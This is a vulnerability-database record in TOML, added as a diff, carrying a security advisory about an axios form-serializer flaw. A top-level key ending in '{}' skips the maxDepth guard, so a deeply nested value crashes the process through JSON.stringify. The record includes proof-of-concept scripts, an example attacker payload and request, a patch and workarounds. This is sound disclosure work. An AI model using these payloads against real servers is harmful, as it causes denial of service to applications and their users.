@@ -1,0 +1,255 @@
+[basic]
+description = '''
+## Summary
+
+Axios versions in the fixed lines for GHSA-62hf-57xw-28j9 still contain an incomplete depth-limit bypass in `lib/helpers/toFormData.js`. When serializing an object with a top-level key ending in `{}`, axios calls `JSON.stringify()` on that value before the `formSerializer.maxDepth` guard can inspect the nested structure.
+
+An attacker who can control object keys and nested values passed by an application into axios form or parameter serialization can trigger a raw `RangeError: Maximum call stack size exceeded`, causing a denial of service in the affected request path.
+
+## Impact
+
+The impact is availability only. No confidentiality or integrity impact was confirmed.
+
+Server-side applications are the primary concern when they accept user-controlled input and pass it into axios as `data` or `params` for `multipart/form-data`, `application/x-www-form-urlencoded`, or default parameter serialization. Browser impact is limited to the page or request context unless the application builds a broader failure mode around the thrown exception.
+
+The attack requires control over a top-level object key ending in `{}` and a deeply nested object value. The option `formSerializer.metaTokens: false` is not a workaround because it only changes the emitted key name; the value is still stringified.
+
+## Affected Functionality
+
+Affected paths include:
+
+- `lib/helpers/toFormData.js` when a top-level key ends with `{}`.
+- `lib/helpers/toURLEncodedForm.js`, which delegates to `helpers.defaultVisitor`.
+- `lib/helpers/AxiosURLSearchParams.js`, used by default params serialization.
+- Request transforms in `lib/defaults/index.js` when object data is serialized as `multipart/form-data` or `application/x-www-form-urlencoded`.
+
+Unaffected paths include:
+
+- Already-created `FormData` or `URLSearchParams` values that axios does not walk with `toFormData`.
+- Custom `paramsSerializer.serialize` implementations that do not call axios `toFormData`.
+- Non-`{}` deeply nested values in `toFormData`, which hit `ERR_FORM_DATA_DEPTH_EXCEEDED` as intended.
+
+## Technical Details
+
+In `lib/helpers/toFormData.js`, `defaultVisitor()` handles top-level keys ending in `{}` before recursive traversal:
+
+```js
+if (value && !path && typeof value === 'object') {
+  if (utils.endsWith(key, '{}')) {
+    key = metaTokens ? key : key.slice(0, -2);
+    value = JSON.stringify(value);
+  }
+}
+```
+
+The depth guard is in `build()`:
+
+```js
+if (depth > maxDepth) {
+  throw new AxiosError(
+    'Object is too deeply nested (' + depth + ' levels). Max depth: ' + maxDepth,
+    AxiosError.ERR_FORM_DATA_DEPTH_EXCEEDED
+  );
+}
+```
+
+For `{}` metatoken values, `build()` only sees the top-level property. The nested value is handed directly to native `JSON.stringify()`, which recurses internally and can throw `RangeError` before axios emits the intended `AxiosError`.
+
+## Proof of Concept of Attack
+
+Safe local PoC with no network I/O:
+
+```js
+import toFormData from './lib/helpers/toFormData.js';
+
+function buildDeep(depth) {
+  const head = {};
+  let cur = head;
+
+  for (let i = 0; i < depth; i += 1) {
+    cur.x = {};
+    cur = cur.x;
+  }
+
+  return head;
+}
+
+try {
+  toFormData({ 'evil{}': buildDeep(10000) });
+} catch (err) {
+  console.log(err.name, err.code || '', err.message);
+}
+
+// Expected affected result:
+// RangeError  Maximum call stack size exceeded
+```
+
+Expected fixed behavior is an `AxiosError` with code `ERR_FORM_DATA_DEPTH_EXCEEDED`.
+
+## Workarounds
+
+Reject or depth-limit untrusted objects before passing them to axios serialization.
+
+Strip or reject top-level keys ending in `{}` from untrusted objects when using axios form serialization.
+
+For query parameters, use a custom `paramsSerializer.serialize` that enforces a depth limit.
+
+For form bodies, construct `FormData` or `URLSearchParams` manually after validating input depth.
+
+<details>
+<summary>Original Report</summary>
+
+## Summary
+The `maxDepth=100` guard added in axios 1.15.0 to fix GHSA-62hf-57xw-28j9 lives inside the `build()` recursion in `lib/helpers/toFormData.js`. The default visitor at `lib/helpers/toFormData.js:166-170` still has a top-level shortcut that calls `JSON.stringify(value)` whenever a key ends in `'{}'`, before `build()` ever sees the nested value. JSON.stringify on a deeply nested object stack-overflows with `RangeError: Maximum call stack size exceeded`, which propagates synchronously out of the axios call. The exact attacker-data flow that the original advisory described (proxy-style code that forwards client JSON into `axios({ data, params })`) still crashes the process at depth ~3000 on a default Node.js stack, despite v1.16.0 being patched.
+
+## Details
+Affected: axios 1.15.0 - 1.16.0 (every released version that carries the GHSA-62hf-57xw-28j9 fix). The bug is reachable from any code path that hits `toFormData`, which includes:
+
+- `axios.post(url, data, { headers: { 'content-type': 'application/x-www-form-urlencoded' } })` -> `defaults.transformRequest` -> `toURLEncodedForm(data)` -> `toFormData`
+- `axios.post(url, data, { headers: { 'content-type': 'multipart/form-data' } })` -> same path via `toFormData`
+- `axios.get(url, { params })` -> `buildURL` -> `new AxiosURLSearchParams(params)` -> `toFormData`
+
+Vulnerable code, `lib/helpers/toFormData.js`:
+
+```javascript
+// 156 function defaultVisitor(value, key, path) {
+// 165 if (value && !path && typeof value === 'object') {
+// 166 if (utils.endsWith(key, '{}')) {
+// 167 // eslint-disable-next-line no-param-reassign
+// 168 key = metaTokens ? key : key.slice(0, -2);
+// 169 // eslint-disable-next-line no-param-reassign
+// 170 value = JSON.stringify(value); // <-- V8 native, NOT depth-checked
+// 171 } else if (...
+```
+
+`build()` later does enforce `maxDepth`:
+
+```javascript
+// 211 function build(value, path, depth = 0) {
+// 212 if (utils.isUndefined(value)) return;
+// 213
+// 214 if (depth > maxDepth) {
+// 215 throw new AxiosError(
+// 216 'Object is too deeply nested (' + depth + ' levels). Max depth: ' + maxDepth,
+// 217 AxiosError.ERR_FORM_DATA_DEPTH_EXCEEDED
+// 218 );
+```
+
+The `'{}'` shortcut runs in `defaultVisitor`, which is invoked from inside `build()` for top-level keys (the `!path` clause at line 165 means the shortcut only triggers at top level, where `path` is `undefined`). At that point `depth === 0` and the maxDepth check has already passed; the recursion-aware guard never sees the nested value because `defaultVisitor` reassigns `value = JSON.stringify(value)` and returns the rendered string straight to `formData.append`. JSON.stringify itself is recursive in V8 and stack-overflows on deeply nested objects, throwing `RangeError` synchronously.
+
+The behaviour is independent of the `metaTokens` option: line 168 only changes whether `'{}'` stays on the key name, line 170 stringifies regardless. `toURLEncodedForm`'s wrapper visitor in `lib/helpers/toURLEncodedForm.js:11-14` falls through to the same `defaultVisitor`, so the form-encoded path is also affected.
+
+The attacker payload is a single top-level key ending in `'{}'` whose value is a nested object. The keys themselves do not have to be deep, so the payload is small to send (a few KB of `{\"x\":{\"x\":...}}` produces enough nesting to overflow). The original advisory's threat model -- a server that forwards `req.body` or `req.query` into axios -- is unchanged:
+
+```javascript
+app.post('/forward', async (req, res) => {
+ await axios.post('https://upstream/api', req.body); // req.body attacker-controlled
+ res.send('ok');
+});
+// attacker POST /forward with content-type: application/x-www-form-urlencoded
+// body: {\"evil{}\": <8000-deep object>}
+// -> JSON.stringify recurses inside defaultVisitor -> RangeError -> handler crashes
+```
+
+The error is not an `AxiosError`; it is a raw `RangeError` thrown from the stringifier, so handlers that look for `err.code === 'ERR_FORM_DATA_DEPTH_EXCEEDED'` (the documented signal that the maxDepth guard fired) do not see it. Synchronous startup paths or worker threads still take the whole process down.
+
+The fix is to also depth-limit (or pre-walk) the value before calling `JSON.stringify` on line 170, or to remove the top-level `'{}'` shortcut and rely on the depth-checked `build()` recursion to handle it. A minimal patch that preserves observable behaviour for legal payloads:
+
+```diff
+ if (utils.endsWith(key, '{}')) {
+ // eslint-disable-next-line no-param-reassign
+ key = metaTokens ? key : key.slice(0, -2);
++ // Reject objects that would exceed maxDepth before handing to JSON.stringify,
++ // which is recursive in V8 and stack-overflows on deeply nested input.
++ (function checkDepth(v, d) {
++ if (d > maxDepth) {
++ throw new AxiosError(
++ 'Object is too deeply nested (' + d + ' levels). Max depth: ' + maxDepth,
++ AxiosError.ERR_FORM_DATA_DEPTH_EXCEEDED
++ );
++ }
++ if (v && typeof v === 'object') {
++ for (const k in v) checkDepth(v[k], d + 1);
++ }
++ })(value, 0);
+ // eslint-disable-next-line no-param-reassign
+ value = JSON.stringify(value);
+ }
+```
+
+(The recursion in `checkDepth` itself is bounded by `maxDepth`, so it cannot itself overflow.)
+
+## PoC
+Reproduces against a clean clone of `axios/axios` at v1.16.0 with `npm install` already run. `targets/axios/poc_jsonstringify_dos.mjs` is the script:
+
+```javascript
+import axios from './source/index.js';
+
+function buildDeep(depth) {
+ let head = {};
+ let cur = head;
+ for (let i = 0; i < depth; i++) { cur.x = {}; cur = cur.x; }
+ return head;
+}
+
+const malicious = buildDeep(5000);
+const safeAdapter = () => Promise.resolve({
+ data: 'never reached', status: 200, statusText: 'OK', headers: {}, config: {}
+});
+
+// 1. POST x-www-form-urlencoded
+try {
+ await axios.post('http://example.test/x',
+ { 'evil{}': malicious },
+ { headers: { 'content-type': 'application/x-www-form-urlencoded' }, adapter: safeAdapter });
+} catch (e) {
+ console.log('POST form-encoded:', e.name, '-', e.message);
+}
+
+// 2. GET with params
+try {
+ await axios.get('http://example.test/x',
+ { params: { 'evil{}': malicious }, adapter: safeAdapter });
+} catch (e) {
+ console.log('GET params:', e.name, '-', e.message);
+}
+```
+
+3/3 runs reproduce the same `RangeError` on `axios@1.16.0` with Node.js 24:
+
+```
+$ node poc_jsonstringify_dos.mjs
+POST form-encoded: RangeError - Maximum call stack size exceeded
+GET params: RangeError - Maximum call stack size exceeded
+```
+
+`safeAdapter` is a stub that returns a fake response, so the crash is provably inside axios's serialization layer, not in HTTP I/O. Removing the `'{}'` suffix from the key and re-running gives the expected `AxiosError: Object is too deeply nested ... ERR_FORM_DATA_DEPTH_EXCEEDED` from the maxDepth guard, confirming the fix is wired correctly elsewhere -- it just does not cover this branch.
+
+Crash threshold on a default-stack Node.js process is roughly depth 2500-3000; 8000 is comfortably above that, and the payload is a few KB.
+
+## Impact
+A remote, unauthenticated attacker who can influence an object that the application passes to axios as request `data` or `params` triggers an uncaught `RangeError` from inside the synchronous `JSON.stringify` call in `defaultVisitor`. In server-side applications that proxy or re-forward client JSON through axios -- the same threat model that motivated GHSA-62hf-57xw-28j9 -- this crashes the request handler and, in worker/cluster setups, the whole process. The previously shipped `maxDepth` guard does not stop it because the `'{}'` suffix path bypasses `build()` entirely. Same severity class as the original advisory (CWE-674 Uncontrolled Recursion, network-reachable DoS); the only difference is the attacker has to suffix one of their object keys with `'{}'` to land on the unguarded code path.
+</details>
+'''
+published = ""
+remediation = "请参考官方安全公告，及时安装安全更新或升级到最新版本。"
+score = 5
+severity = "MEDIUM"
+sources = ["ghsa"]
+title = "Axios form serializer maxDepth bypass via {} metatoken"
+updated = ""
+
+[exploit]
+exp_urls = []
+poc_urls = []
+
+[id]
+aliases = ["GHSA-hcpx-6fm6-wx23"]
+ave_id = "AVE-2026-1124"
+
+[meta]
+collected_at = "2026-08-06T05:40:35.705830167+00:00"
+status = "completed"
+
+[references]
+urls = []
